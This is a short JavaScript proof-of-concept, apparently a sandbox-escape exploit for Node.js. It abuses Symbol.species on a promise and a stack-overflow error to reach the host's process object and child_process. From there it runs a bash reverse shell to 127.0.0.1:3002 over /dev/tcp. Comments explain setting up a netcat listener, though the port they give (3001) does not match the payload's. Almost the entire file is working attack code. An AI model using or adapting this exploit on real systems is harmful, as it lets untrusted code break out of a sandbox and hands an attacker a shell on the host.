async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}

p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync("/bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/3002 0>&1'"); }
                // this example attempts a reverse shell and expects a listener on port 3002
                // it can be setup using the following command: 'ncat -l -v -p 3001'
                // otherwise, you can replace the command provided in execSync method with a simpler command
                // e.g. 'touch pwned', which will simply create a file on the host system
            )
        }
    }
};
p.then();
